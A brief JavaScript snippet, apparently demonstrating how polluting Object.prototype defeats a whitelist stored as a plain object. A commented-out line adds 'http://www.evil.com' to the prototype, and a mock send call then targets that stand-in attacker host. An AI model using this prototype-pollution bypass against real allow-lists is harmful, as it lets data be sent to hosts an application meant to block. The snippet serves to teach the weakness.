function mkSend(rawSend) {
  var whiteList = { "http://www.microsoft.com/mail": true,
                    "http://www.microsoft.com/owa" : true };
  function newSend (target, msg) {
    if (whiteList[target]) {
      rawSend(target,msg);
    } else {
      console.log("Rejected.");
    }
  }
  return newSend;
}

send = mkSend(function (target, msg) {
  console.log("Sent " + msg + " to " + target);
});

//Object.prototype["http://www.evil.com"] = true;
send("http://www.evil.com","msg"); // Sent msg to http://www.evil.com
